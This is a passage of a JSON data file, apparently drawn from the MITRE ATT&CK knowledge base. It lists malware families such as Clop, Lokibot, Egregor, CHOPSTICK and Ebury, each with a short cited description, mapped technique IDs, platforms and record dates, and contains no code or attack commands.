      "description": "[Clop](https://attack.mitre.org/software/S0611) is a ransomware family that was first observed in February 2019 and has been used against retail, transportation and logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional and legal services, healthcare, and high tech industries. [Clop](https://attack.mitre.org/software/S0611) is a variant of the CryptoMix ransomware.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020)(Citation: Unit42 Clop April 2021) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1518.001",
        "T1489",
        "T1140",
        "T1106",
        "T1497.003",
        "T1562.001",
        "T1027.002",
        "T1614.001",
        "T1083",
        "T1057",
        "T1059.003",
        "T1553.002",
        "T1112",
        "T1135",
        "T1490",
        "T1486",
        "T1218.007"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0611",
      "stix_id": "malware--cad3ba95-8c89-4146-ab10-08daa813f9de",
      "created": "2021-05-10T23:19:38.608000+00:00",
      "modified": "2025-04-25T14:44:41.142000+00:00"
    },
    "S0033": {
      "id": "S0033",
      "name": "NetTraveler",
      "description": "[NetTraveler](https://attack.mitre.org/software/S0033) is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013. (Citation: Kaspersky NetTraveler)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1010",
        "T1056.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0033",
      "stix_id": "malware--cafd0bf8-2b9c-46c7-ae3c-3e0f42c5062e",
      "created": "2017-05-31T21:32:25.361000+00:00",
      "modified": "2024-11-17T18:04:41.738000+00:00"
    },
    "S0388": {
      "id": "S0388",
      "name": "YAHOYAH",
      "description": "[YAHOYAH](https://attack.mitre.org/software/S0388) is a Trojan used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) as a second-stage backdoor.(Citation: TrendMicro TropicTrooper 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1105",
        "T1518.001",
        "T1140",
        "T1071.001",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0388",
      "stix_id": "malware--cb444a16-3ea5-4a91-88c6-f329adcb8af3",
      "created": "2019-06-17T18:49:30.307000+00:00",
      "modified": "2024-04-19T13:19:32.736000+00:00"
    },
    "S0447": {
      "id": "S0447",
      "name": "Lokibot",
      "description": "[Lokibot](https://attack.mitre.org/software/S0447) is a widely distributed information stealer that was first reported in 2015. It is designed to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials. [Lokibot](https://attack.mitre.org/software/S0447) can also create a backdoor into infected systems to allow an attacker to install additional payloads.(Citation: Infoblox Lokibot January 2019)(Citation: Morphisec Lokibot April 2020)(Citation: CISA Lokibot September 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.005",
        "T1566.001",
        "T1027.002",
        "T1027",
        "T1140",
        "T1555",
        "T1620",
        "T1055.012",
        "T1033",
        "T1083",
        "T1056.001",
        "T1059.003",
        "T1112",
        "T1053.005",
        "T1497.003",
        "T1041",
        "T1053",
        "T1548.002",
        "T1082",
        "T1106",
        "T1564.001",
        "T1059.001",
        "T1016",
        "T1070.004",
        "T1204.002",
        "T1071.001",
        "T1105",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0447",
      "stix_id": "malware--cb741463-f0fe-42e0-8d45-bc7e8335f5ae",
      "created": "2020-05-14T17:31:33.707000+00:00",
      "modified": "2025-04-25T14:44:41.863000+00:00"
    },
    "S0077": {
      "id": "S0077",
      "name": "CallMe",
      "description": "[CallMe](https://attack.mitre.org/software/S0077) is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell. (Citation: Scarlet Mimic Jan 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1573.001",
        "T1059.004",
        "T1041"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0077",
      "stix_id": "malware--cb7bcf6f-085f-41db-81ee-4b68481661b5",
      "created": "2017-05-31T21:32:52.875000+00:00",
      "modified": "2025-04-25T14:44:42.237000+00:00"
    },
    "S0112": {
      "id": "S0112",
      "name": "ROCKBOOT",
      "description": "[ROCKBOOT](https://attack.mitre.org/software/S0112) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that has been used by an unidentified, suspected China-based group. (Citation: FireEye Bootkits)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1542.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0112",
      "stix_id": "malware--cba78a1c-186f-4112-9e6a-be1839f030f7",
      "created": "2017-05-31T21:33:07.565000+00:00",
      "modified": "2025-04-25T14:44:42.600000+00:00"
    },
    "S0054": {
      "id": "S0054",
      "name": "CloudDuke",
      "description": "[CloudDuke](https://attack.mitre.org/software/S0054) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: F-Secure The Dukes) (Citation: Securelist Minidionis July 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1102.002",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0054",
      "stix_id": "malware--cbf646f1-7db5-4dc6-808b-0094313949df",
      "created": "2017-05-31T21:32:38.128000+00:00",
      "modified": "2025-04-25T14:44:42.958000+00:00"
    },
    "S0554": {
      "id": "S0554",
      "name": "Egregor",
      "description": "[Egregor](https://attack.mitre.org/software/S0554) is a Ransomware-as-a-Service (RaaS) tool that was first observed in September 2020. Researchers have noted code similarities between [Egregor](https://attack.mitre.org/software/S0554) and Sekhmet ransomware, as well as [Maze](https://attack.mitre.org/software/S0449) ransomware.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)(Citation: Security Boulevard Egregor Oct 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1497.003",
        "T1218.011",
        "T1197",
        "T1124",
        "T1027.002",
        "T1039",
        "T1106",
        "T1140",
        "T1036.004",
        "T1049",
        "T1033",
        "T1105",
        "T1497",
        "T1574.001",
        "T1486",
        "T1069.002",
        "T1562.001",
        "T1218.010",
        "T1071.001",
        "T1219",
        "T1059.003",
        "T1484.001",
        "T1055",
        "T1059.001",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0554",
      "stix_id": "malware--cc4c1287-9c86-4447-810c-744f3880ec37",
      "created": "2020-12-29T21:32:27.939000+00:00",
      "modified": "2025-04-25T14:44:43.318000+00:00"
    },
    "S0428": {
      "id": "S0428",
      "name": "PoetRAT",
      "description": "[PoetRAT](https://attack.mitre.org/software/S0428) is a remote access trojan (RAT) that was first identified in April 2020. [PoetRAT](https://attack.mitre.org/software/S0428) has been used in multiple campaigns against the private and public sectors in Azerbaijan, including ICS and SCADA systems in the energy sector. The STIBNITE activity group has been observed using the malware. [PoetRAT](https://attack.mitre.org/software/S0428) derived its name from references in the code to poet William Shakespeare. (Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020)(Citation: Dragos Threat Report 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1041",
        "T1071.002",
        "T1027.010",
        "T1059.003",
        "T1048",
        "T1204.002",
        "T1571",
        "T1112",
        "T1566.001",
        "T1083",
        "T1105",
        "T1564.001",
        "T1119",
        "T1125",
        "T1048.003",
        "T1497.001",
        "T1018",
        "T1071.001",
        "T1082",
        "T1559.002",
        "T1003.001",
        "T1057",
        "T1059.005",
        "T1573.002",
        "T1059.006",
        "T1113",
        "T1140",
        "T1027",
        "T1059.011",
        "T1547.001",
        "T1070.004",
        "T1555.003",
        "T1560.001",
        "T1056.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0428",
      "stix_id": "malware--cc5497f7-a9e8-436f-94da-b2b4a9b9ad3c",
      "created": "2020-04-27T20:21:16.487000+00:00",
      "modified": "2024-08-05T18:24:31.652000+00:00"
    },
    "S0023": {
      "id": "S0023",
      "name": "CHOPSTICK",
      "description": "[CHOPSTICK](https://attack.mitre.org/software/S0023) is a malware family of modular backdoors used by [APT28](https://attack.mitre.org/groups/G0007). It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants. (Citation: FireEye APT28) (Citation: ESET Sednit Part 2) (Citation: FireEye APT28 January 2017) (Citation: DOJ GRU Indictment Jul 2018) It is tracked separately from the [X-Agent for Android](https://attack.mitre.org/software/S0314).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1008",
        "T1092",
        "T1090.001",
        "T1059",
        "T1071.003",
        "T1071.001",
        "T1112",
        "T1497",
        "T1113",
        "T1105",
        "T1518.001",
        "T1083",
        "T1027.011",
        "T1056.001",
        "T1091",
        "T1568.002",
        "T1573.001",
        "T1573.002",
        "T1012"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0023",
      "stix_id": "malware--ccd61dfc-b03f-4689-8c18-7c97eab08472",
      "created": "2017-05-31T21:32:19.389000+00:00",
      "modified": "2024-11-17T14:43:38.592000+00:00"
    },
    "S1200": {
      "id": "S1200",
      "name": "StealBit",
      "description": "[StealBit](https://attack.mitre.org/software/S1200) is a data exfiltration tool that is developed and maintained by the operators of the the LockBit Ransomware-as-a-Service (RaaS) and offered to affiliates to exfiltrate data from compromised systems for double extortion purposes.(Citation: Cybereason StealBit Exfiltration Tool)(Citation: FBI Lockbit 2.0 FEB 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1622",
        "T1559",
        "T1070.004",
        "T1030",
        "T1027.013",
        "T1106",
        "T1082",
        "T1480",
        "T1005",
        "T1614.001",
        "T1562.006",
        "T1095",
        "T1071.001",
        "T1140",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1200",
      "stix_id": "malware--cf8b27df-c494-4a0c-b093-556a80ad2bcf",
      "created": "2025-01-29T20:13:25.762000+00:00",
      "modified": "2025-01-29T20:17:12.643000+00:00"
    },
    "S0267": {
      "id": "S0267",
      "name": "FELIXROOT",
      "description": "[FELIXROOT](https://attack.mitre.org/software/S0267) is a backdoor that has been used to target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1112",
        "T1518.001",
        "T1027.013",
        "T1082",
        "T1012",
        "T1071.001",
        "T1016",
        "T1047",
        "T1124",
        "T1560",
        "T1218.011",
        "T1033",
        "T1547.009",
        "T1105",
        "T1059.003",
        "T1547.001",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0267",
      "stix_id": "malware--cf8df906-179c-4a78-bd6e-6605e30f6624",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-11-17T16:15:55.203000+00:00"
    },
    "S0412": {
      "id": "S0412",
      "name": "ZxShell",
      "description": "[ZxShell](https://attack.mitre.org/software/S0412) is a remote administration tool and backdoor that can be downloaded from the Internet, particularly from Chinese hacker websites. It has been used since at least 2004.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1021.005",
        "T1082",
        "T1090",
        "T1071.001",
        "T1571",
        "T1056.004",
        "T1083",
        "T1113",
        "T1012",
        "T1005",
        "T1033",
        "T1190",
        "T1057",
        "T1046",
        "T1112",
        "T1070.001",
        "T1070.004",
        "T1562.004",
        "T1543.003",
        "T1071.002",
        "T1055.001",
        "T1059.003",
        "T1021.001",
        "T1134.002",
        "T1125",
        "T1218.011",
        "T1562.001",
        "T1136.001",
        "T1499",
        "T1106",
        "T1569.002",
        "T1056.001",
        "T1007",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0412",
      "stix_id": "malware--cfc75b0d-e579-40ae-ad07-a1ce00d49a6c",
      "created": "2019-09-24T12:59:57.991000+00:00",
      "modified": "2025-04-16T20:38:36.169000+00:00"
    },
    "S1110": {
      "id": "S1110",
      "name": "SLIGHTPULSE",
      "description": "[SLIGHTPULSE](https://attack.mitre.org/software/S1110) is a web shell that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including against Pulse Secure VPNs at US Defense Industrial Base (DIB) entities.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1074.001",
        "T1132.001",
        "T1505.003",
        "T1105",
        "T1140",
        "T1005",
        "T1059",
        "T1071.001",
        "T1573.001"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1110",
      "stix_id": "malware--d1008b78-960c-4b36-bdc4-39a734e1e4e3",
      "created": "2024-02-09T19:21:04.773000+00:00",
      "modified": "2025-04-15T19:46:35.556000+00:00"
    },
    "S0272": {
      "id": "S0272",
      "name": "NDiskMonitor",
      "description": "[NDiskMonitor](https://attack.mitre.org/software/S0272) is a custom backdoor written in .NET that appears to be unique to [Patchwork](https://attack.mitre.org/groups/G0040). (Citation: TrendMicro Patchwork Dec 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1573.001",
        "T1105",
        "T1082",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0272",
      "stix_id": "malware--d1183cb9-258e-4f2f-8415-50ac8252c49e",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:44.759000+00:00"
    },
    "S0369": {
      "id": "S0369",
      "name": "CoinTicker",
      "description": "[CoinTicker](https://attack.mitre.org/software/S0369) is a malicious application that poses as a cryptocurrency price ticker and installs components of the open source backdoors EvilOSX and EggShell.(Citation: CoinTicker 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.001",
        "T1027",
        "T1059.004",
        "T1105",
        "T1140",
        "T1543.001",
        "T1059.006",
        "T1059.003",
        "T1553.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0369",
      "stix_id": "malware--d1531eaa-9e17-473e-a680-3298469662c3",
      "created": "2019-04-23T18:41:36.914000+00:00",
      "modified": "2025-04-25T14:44:45.121000+00:00"
    },
    "S0255": {
      "id": "S0255",
      "name": "DDKONG",
      "description": "[DDKONG](https://attack.mitre.org/software/S0255) is a malware sample that was part of a campaign by [Rancor](https://attack.mitre.org/groups/G0075). [DDKONG](https://attack.mitre.org/software/S0255) was first seen used in February 2017. (Citation: Rancor Unit42 June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1140",
        "T1218.011",
        "T1083"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0255",
      "stix_id": "malware--d186c1d6-e3ac-4c3d-a534-9ddfeb8c57bb",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-09-04T21:38:11.979000+00:00"
    },
    "S0587": {
      "id": "S0587",
      "name": "Penquin",
      "description": "[Penquin](https://attack.mitre.org/software/S0587) is a remote access trojan (RAT) with multiple versions used by [Turla](https://attack.mitre.org/groups/G0010) to target Linux systems since at least 2014.(Citation: Kaspersky Turla Penquin December 2014)(Citation: Leonardo Turla Penquin May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.004",
        "T1016",
        "T1205",
        "T1036.005",
        "T1105",
        "T1053.003",
        "T1040",
        "T1573.002",
        "T1027.005",
        "T1222.002",
        "T1041",
        "T1205.002",
        "T1095",
        "T1083",
        "T1082",
        "T1070.004",
        "T1027.013"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0587",
      "stix_id": "malware--d18cb958-f4ad-4fb3-bb4f-e8994d206550",
      "created": "2021-03-11T15:06:57.934000+00:00",
      "modified": "2024-04-11T00:27:30.199000+00:00"
    },
    "S0414": {
      "id": "S0414",
      "name": "BabyShark",
      "description": "[BabyShark](https://attack.mitre.org/software/S0414) is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. (Citation: Unit42 BabyShark Feb 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1033",
        "T1105",
        "T1012",
        "T1218.005",
        "T1056.001",
        "T1057",
        "T1059.005",
        "T1083",
        "T1140",
        "T1082",
        "T1132.001",
        "T1070.004",
        "T1547.001",
        "T1016",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0414",
      "stix_id": "malware--d1b7830a-fced-4be3-a99c-f495af9d9e1b",
      "created": "2019-10-07T19:05:48.886000+00:00",
      "modified": "2024-05-06T20:38:32.432000+00:00"
    },
    "S0351": {
      "id": "S0351",
      "name": "Cannon",
      "description": "[Cannon](https://attack.mitre.org/software/S0351) is a Trojan with variants written in C# and Delphi. It was first observed in April 2018. (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1113",
        "T1033",
        "T1041",
        "T1071.003",
        "T1124",
        "T1083",
        "T1105",
        "T1082",
        "T1547.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0351",
      "stix_id": "malware--d20b397a-ea47-48a9-b503-2e2a3551e11d",
      "created": "2019-01-30T18:58:03.614000+00:00",
      "modified": "2025-04-25T14:44:46.016000+00:00"
    },
    "S1024": {
      "id": "S1024",
      "name": "CreepySnail",
      "description": "[CreepySnail](https://attack.mitre.org/software/S1024) is a custom PowerShell implant that has been used by [POLONIUM](https://attack.mitre.org/groups/G1005) since at least 2022.(Citation: Microsoft POLONIUM June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1078.002",
        "T1071.001",
        "T1016",
        "T1132.001",
        "T1059.001",
        "T1041",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1024",
      "stix_id": "malware--d23de441-f9cf-4802-b1ff-f588a11a896b",
      "created": "2022-07-08T14:05:44.014000+00:00",
      "modified": "2025-04-16T20:38:36.803000+00:00"
    },
    "S0471": {
      "id": "S0471",
      "name": "build_downer",
      "description": "[build_downer](https://attack.mitre.org/software/S0471) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1036.004",
        "T1547.001",
        "T1027.003",
        "T1124",
        "T1518.001",
        "T1082",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0471",
      "stix_id": "malware--d2c7f8ad-3b50-4cfa-bbb1-799eff06fb40",
      "created": "2020-06-10T18:44:10.896000+00:00",
      "modified": "2025-04-25T14:44:46.558000+00:00"
    },
    "S0530": {
      "id": "S0530",
      "name": "Melcoz",
      "description": "[Melcoz](https://attack.mitre.org/software/S0530) is a banking trojan family built from the open source tool Remote Access PC. [Melcoz](https://attack.mitre.org/software/S0530) was first observed in attacks in Brazil and since 2018 has spread to Chile, Mexico, Spain, and Portugal.(Citation: Securelist Brazilian Banking Malware July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1565.002",
        "T1059.010",
        "T1218.007",
        "T1185",
        "T1105",
        "T1574.001",
        "T1555.003",
        "T1059.005",
        "T1027.002",
        "T1115",
        "T1204.001",
        "T1566.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0530",
      "stix_id": "malware--d3105fb5-c494-4fd1-a7be-414eab9e0c96",
      "created": "2020-11-10T20:24:50.464000+00:00",
      "modified": "2024-03-29T18:12:59.212000+00:00"
    },
    "S0141": {
      "id": "S0141",
      "name": "Winnti for Windows",
      "description": "[Winnti for Windows](https://attack.mitre.org/software/S0141) is a modular remote access Trojan (RAT) that has been used likely by multiple groups to carry out intrusions in various regions since at least 2010, including by one group referred to as the same name, [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: Kaspersky Winnti April 2013)(Citation: Microsoft Winnti Jan 2017)(Citation: Novetta Winnti April 2015)(Citation: 401 TRG Winnti Umbrella May 2018). The Linux variant is tracked separately under [Winnti for Linux](https://attack.mitre.org/software/S0430).(Citation: Chronicle Winnti for Linux May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1543.003",
        "T1573.001",
        "T1083",
        "T1090.002",
        "T1095",
        "T1057",
        "T1547.001",
        "T1090.001",
        "T1218.011",
        "T1548.002",
        "T1082",
        "T1027.015",
        "T1569.002",
        "T1105",
        "T1070.004",
        "T1070.006",
        "T1027.013",
        "T1140",
        "T1071.001",
        "T1036.005",
        "T1480.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0141",
      "stix_id": "malware--d3afa961-a80c-4043-9509-282cdf69ab21",
      "created": "2017-05-31T21:33:21.027000+00:00",
      "modified": "2024-04-10T20:35:29.262000+00:00"
    },
    "S0685": {
      "id": "S0685",
      "name": "PowerPunch",
      "description": "[PowerPunch](https://attack.mitre.org/software/S0685) is a lightweight downloader that has been used by [Gamaredon Group](https://attack.mitre.org/groups/G0047) since at least 2021.(Citation: Microsoft Actinium February 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.010",
        "T1059.001",
        "T1105",
        "T1480.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0685",
      "stix_id": "malware--d52291b4-bb23-45a8-aef0-3dc7e986ba15",
      "created": "2022-02-18T15:50:16.715000+00:00",
      "modified": "2025-04-16T20:38:37.108000+00:00"
    },
    "S0360": {
      "id": "S0360",
      "name": "BONDUPDATER",
      "description": "[BONDUPDATER](https://attack.mitre.org/software/S0360) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1564.003",
        "T1071.004",
        "T1053.005",
        "T1568.002",
        "T1105",
        "T1059.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0360",
      "stix_id": "malware--d5268dfb-ae2b-4e0e-ac07-02a460613d8a",
      "created": "2019-02-18T20:16:12.119000+00:00",
      "modified": "2025-04-25T14:44:47.458000+00:00"
    },
    "S1196": {
      "id": "S1196",
      "name": "Troll Stealer",
      "description": "[Troll Stealer](https://attack.mitre.org/software/S1196) is an information stealer written in Go associated with [Kimsuky](https://attack.mitre.org/groups/G0094) operations. [Troll Stealer](https://attack.mitre.org/software/S1196) has typically been delivered through a dropper disguised as a legitimate security program installation file. [Troll Stealer](https://attack.mitre.org/software/S1196) features code similar to [AppleSeed](https://attack.mitre.org/software/S0622), also uniquely associated with [Kimsuky](https://attack.mitre.org/groups/G0094) operations.(Citation: S2W Troll Stealer 2024)(Citation: Symantec Troll Stealer 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1074.001",
        "T1113",
        "T1132.001",
        "T1027.002",
        "T1016",
        "T1071.001",
        "T1059.001",
        "T1553.002",
        "T1059.003",
        "T1036.005",
        "T1552.004",
        "T1560",
        "T1213",
        "T1083",
        "T1480.002",
        "T1082",
        "T1218.011",
        "T1041",
        "T1217",
        "T1573.001",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1196",
      "stix_id": "malware--d6748457-75c2-4989-a41f-2d017994057e",
      "created": "2025-01-17T19:52:28.057000+00:00",
      "modified": "2025-03-24T15:56:14.888000+00:00"
    },
    "S0069": {
      "id": "S0069",
      "name": "BLACKCOFFEE",
      "description": "[BLACKCOFFEE](https://attack.mitre.org/software/S0069) is malware that has been used by several Chinese groups since at least 2013. (Citation: FireEye APT17) (Citation: FireEye Periscope March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1104",
        "T1059.003",
        "T1057",
        "T1102.001",
        "T1070.004",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0069",
      "stix_id": "malware--d69c8146-ab35-4d50-8382-6fc80e641d43",
      "created": "2017-05-31T21:32:45.892000+00:00",
      "modified": "2024-11-17T15:03:54.770000+00:00"
    },
    "S1136": {
      "id": "S1136",
      "name": "BFG Agonizer",
      "description": "[BFG Agonizer](https://attack.mitre.org/software/S1136) is a wiper related to the open-source project CRYLINE-v.5.0. The malware is associated with wiping operations conducted by the [Agrius](https://attack.mitre.org/groups/G1030) threat actor.(Citation: Unit42 Agrius 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1529",
        "T1554",
        "T1561.002",
        "T1490"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1136",
      "stix_id": "malware--d6aefbbf-fbef-485a-973e-b5403d8f8b18",
      "created": "2024-05-22T22:51:51.324000+00:00",
      "modified": "2024-08-29T15:21:10.780000+00:00"
    },
    "S0377": {
      "id": "S0377",
      "name": "Ebury",
      "description": "[Ebury](https://attack.mitre.org/software/S0377) is an OpenSSH backdoor and credential stealer targeting Linux servers and container hosts developed by [Windigo](https://attack.mitre.org/groups/G0124). [Ebury](https://attack.mitre.org/software/S0377) is primarily installed through modifying shared libraries (`.so` files) executed by the legitimate OpenSSH program. First seen in 2009, [Ebury](https://attack.mitre.org/software/S0377) has been used to maintain a botnet of servers, deploy additional malware, and steal cryptocurrency wallets, credentials, and credit card details.(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)(Citation: ESET Ebury Oct 2017)(Citation: ESET Ebury May 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1014",
        "T1059.004",
        "T1556.003",
        "T1071.004",
        "T1562.001",
        "T1008",
        "T1140",
        "T1556",
        "T1020",
        "T1562.012",
        "T1573.001",
        "T1554",
        "T1027",
        "T1562.006",
        "T1132.001",
        "T1059.006",
        "T1574.006",
        "T1129",
        "T1553.002",
        "T1552.004",
        "T1041",
        "T1568.002"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0377",
      "stix_id": "malware--d6b3fcd0-1c86-4350-96f0-965ed02fcc51",
      "created": "2019-04-19T16:40:24.922000+00:00",
      "modified": "2024-09-20T21:15:51.302000+00:00"
    },
    "S0599": {
      "id": "S0599",
      "name": "Kinsing",
      "description": "[Kinsing](https://attack.mitre.org/software/S0599) is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment. (Citation: Aqua Kinsing April 2020)(Citation: Sysdig Kinsing November 2020)(Citation: Aqua Security Cloud Native Threat Report June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1071.001",
        "T1610",
        "T1078",
        "T1059.004",
        "T1552.004",
        "T1222.002",
        "T1552.003",
        "T1110",
        "T1021.004",
        "T1018",
        "T1133",
        "T1053.003",
        "T1609",
        "T1105",
        "T1057",
        "T1496.001"
      ],
      "platforms": [
        "Containers",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0599",
      "stix_id": "malware--d6e55656-e43f-411f-a7af-45df650471c5",
      "created": "2021-04-06T12:22:23.447000+00:00",
      "modified": "2025-04-25T14:44:48.521000+00:00"
    },
    "S1123": {
      "id": "S1123",
      "name": "PITSTOP",
      "description": "[PITSTOP](https://attack.mitre.org/software/S1123) is a backdoor that was deployed on compromised Ivanti Connect Secure VPNs during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to enable command execution and file read/write.(Citation: Mandiant Cutting Edge Part 3 February 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.002",
        "T1559",
        "T1059.004",
        "T1205.002",
        "T1140"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1123",
      "stix_id": "malware--d79b1800-3b5d-4a4f-8863-8251eca793e2",
      "created": "2024-03-13T21:04:20.890000+00:00",
      "modified": "2025-04-15T19:46:35.647000+00:00"
    },
    "S0688": {
      "id": "S0688",
      "name": "Meteor",
      "description": "[Meteor](https://attack.mitre.org/software/S0688) is a wiper that was used against Iranian government organizations, including Iranian Railways, the Ministry of Roads, and Urban Development systems, in July 2021. [Meteor](https://attack.mitre.org/software/S0688) is likely a newer version of similar wipers called Stardust and Comet that were reportedly used by a group called \"Indra\" since at least 2019 against private companies in Syria.(Citation: Check Point Meteor Aug 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1047",
        "T1489",
        "T1070.001",
        "T1105",
        "T1036.004",
        "T1106",
        "T1491.001",
        "T1053.005",
        "T1562.001",
        "T1059.001",
        "T1531",
        "T1082",
        "T1564.003",
        "T1059.003",
        "T1490",
        "T1485",
        "T1518.001",
        "T1070.004",
        "T1057",
        "T1484.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0688",
      "stix_id": "malware--d79e7a60-5de9-448e-a074-f95d2d80f8d0",
      "created": "2022-03-07T19:08:55.858000+00:00",
      "modified": "2025-04-16T20:38:37.573000+00:00"
    },
    "S0385": {
      "id": "S0385",
      "name": "njRAT",
